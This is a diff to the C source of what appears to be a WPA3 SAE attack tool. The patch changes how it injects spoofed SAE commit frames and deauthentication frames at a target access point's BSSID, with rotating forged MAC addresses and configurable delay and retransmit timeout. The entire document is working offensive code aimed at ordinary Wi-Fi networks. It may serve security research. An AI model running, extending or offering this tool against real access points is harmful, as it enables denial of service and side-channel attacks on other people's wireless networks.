@@ -238,8 +238,8 @@ static struct state
 
 	// TODO: Are these still needed?
 	int started_attack;
-	int rate;
-	int interval;
+	int delay;
+	int timeout;
 
 	// Elliptic curve crypto
 	struct state_ecc ecc;
@@ -367,10 +367,14 @@ static size_t generate_sae_commit_ecc(struct state *state, uint8_t *buf, size_t 
 	return pos - buf;
 }
 
-static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
+static void inject_sae_commit(struct state *state)
 {
 	unsigned char buf[2048] = {0};
 	int len= 0;
+
+	if (!state->started_attack)
+		return;
+	debug(state, 2, "Injecting commit frame using group %d\n", state->group);
 
 	switch (state->group) {
 	case 22:
@@ -402,7 +406,7 @@ static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
 	}
 
 	memcpy(buf + 4, state->bssid, 6);
-	memcpy(buf + 10, srcaddr, 6);
+	memcpy(buf + 10, state->srcaddr, 6);
 	memcpy(buf + 16, state->bssid, 6);
 
 	if (card_write(state, buf, len, NULL) == -1)
@@ -410,15 +414,6 @@ static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
 
 	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
 	state->got_reply = 0;
-}
-
-static void inject_commits(struct state *state)
-{
-	if (!state->started_attack)
-		return;
-
-	debug(state, 2, "Injecting commit frame using group %d\n", state->group);
-	inject_sae_commit(state, state->srcaddr);
 }
 
 static void inject_deauth(struct state *state)
@@ -440,7 +435,7 @@ static void queue_next_commit(struct state *state)
 
 	/* initial expiration of the timer */
 	timespec.it_value.tv_sec = 0;
-	timespec.it_value.tv_nsec = 500 * 1000 * 1000;
+	timespec.it_value.tv_nsec = state->delay * 1000 * 1000;
 	/* periodic expiration of the timer */
 	timespec.it_interval.tv_sec = 0;
 	timespec.it_interval.tv_nsec = 0;
@@ -465,7 +460,7 @@ static void check_timeout(struct state *state)
 		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
 	}
 
-	if (diff.tv_nsec > 750 * 1000 * 1000) {
+	if (diff.tv_nsec > state->timeout * 1000 * 1000) {
 		debug(state, 2, "Detected timeout, deauthenticating and queuing next commit\n");
 
 		inject_deauth(state);
@@ -515,7 +510,7 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 	    || memcmp(buf + pos_src, state->bssid, 6) != 0)
 		return;
 
-	/* Inject commit frames every second */
+	/* Detect Beacon - Inject commit frames every second */
 	if (buf[0] == 0x80 && !state->started_attack)
 	{
 		time_t t = time(NULL);
@@ -526,9 +521,10 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 			tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
 
 		state->started_attack = 1;
+		inject_sae_commit(state);
 	}
-
-	if (len >= 24 + 8 &&
+	/* Detect Authentication frames */
+	else if (len >= 24 + 8 &&
 		buf[0] == 0xb0 && /* Type is Authentication */
 		buf[24] == 0x03 /*&&*/ /* Auth type is SAE */
 		/*buf[26] == 0x01*/) /* Sequence number is 1 */
@@ -670,11 +666,12 @@ static void event_loop(struct state *state, char * dev, int chan)
 	printf("Will spoof MAC addresses in the form %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
 		state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
 	printf("Performing attack using group %d\n", state->group);
+	printf("Using a retransmit timeout of %d ms, and a delay between commits of %d ms\n", state->timeout, state->delay);
 
 	// 3. Initialize futher things to start the attack
 	state->srcaddr[5] = state->curraddr;
 
-	// 4. Initialize timers
+	// 4. Initialize periodic timer to detect timouts
 	timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
 	if (timer_fd == -1)
 		perror("timerfd_create()");
@@ -686,9 +683,8 @@ static void event_loop(struct state *state, char * dev, int chan)
 	/* periodic expiration of the timer */
 	timespec.it_interval.tv_sec = 0;
 	timespec.it_interval.tv_nsec = 100 * 1000*1000;
-	debug(state, 0, "Interval: %d sec, %d usec\n", timespec.it_interval.tv_sec,
-		timespec.it_interval.tv_nsec);
 
+	// 5. Initialize timer used to queue a new commit frame to inject
 	if (timerfd_settime(timer_fd, 0, &timespec, NULL) == -1)
 		perror("timerfd_settime()");
 
@@ -696,7 +692,7 @@ static void event_loop(struct state *state, char * dev, int chan)
 	if (timer_fd == -1)
 		perror("timerfd_create()");
 
-	// 5. Now start the main event loop
+	// 6. Now start the main event loop
 	fprintf(stderr, "Searching for AP ...\n");
 	while (1)
 	{
@@ -716,16 +712,18 @@ static void event_loop(struct state *state, char * dev, int chan)
 		if (fds[0].revents & POLLIN)
 			card_receive(state);
 
+		// This timer is periodically called, detects timeouts, and implicity starts the attack
 		if (fds[1].revents & POLLIN) {
 			uint64_t exp;
 			assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
 			check_timeout(state);
 		}
 
+		// This timer is set when a new commit is queued after receiving a reply or a timeout
 		if (fds[2].revents & POLLIN) {
 			uint64_t exp;
 			assert(read(state->time_fd_inject, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
-			inject_commits(state);
+			inject_sae_commit(state);
 		}
 	}
 }
@@ -864,14 +862,14 @@ static void usage(char * p)
 		   "\n"
 		   "  Options:\n"
 		   "\n"
-		   "       -h         : This help screen\n"
-		   "       -d <iface> : Wifi interface to use\n"
-		   "       -c  <chan> : Channel to use\n"
-		   "       -a bssid   : Target Access Point MAC address\n"
-		   "       -g group   : The curve to use (either 19 or 21)\n"
-		   "       -v <level> : Debug level (1 to 3; default: 1)\n"
-		   "       -r <rate>  : Number of commits to inject every interval\n"
-		   "       -i <inter> : Duration of an interval in ms\n"
+		   "       -h           : This help screen\n"
+		   "       -d <iface>   : Wifi interface to use\n"
+		   "       -c  <chan>   : Channel to use\n"
+		   "       -a bssid     : Target Access Point MAC address\n"
+		   "       -g group     : The curve to use (either 19 or 21)\n"
+		   "       -v <level>   : Debug level (1 to 3; default: 1)\n"
+		   "       -i <inter>   : Delay between two injects in ms\n"
+		   "       -t <timeout> : Timeout in ms to retransmit commit\n"
 		   "\n",
 		   version_info);
 	free(version_info);
@@ -891,11 +889,11 @@ int main(int argc, char * argv[])
 	state->curraddr = 0;
 	state->debug_level = 1;
 	state->group = 24;
-	state->rate = 2;
-	state->interval = 100;
+	state->delay = 500;
+	state->timeout = 750;
 	state->num_addresses = 20;
 
-	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:")) != -1)
+	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:t:")) != -1)
 	{
 		switch (ch)
 		{
@@ -924,18 +922,18 @@ int main(int argc, char * argv[])
 				state->group = atoi(optarg);
 				break;
 
-			case 'r':
-				state->rate = atoi(optarg);
-				if (state->rate < 1) {
-					printf("Please enter a rate above zero\n");
+			case 'i':
+				state->delay = atoi(optarg);
+				if (state->delay < 1) {
+					printf("Please enter an delay above zero\n");
 					return 1;
 				}
 				break;
 
-			case 'i':
-				state->interval = atoi(optarg);
-				if (state->interval < 1) {
-					printf("Please enter an interval above zero\n");
+			case 't':
+				state->timeout = atoi(optarg);
+				if (state->timeout < 1) {
+					printf("Please enter a timeout above zero\n");
 					return 1;
 				}
 				break;
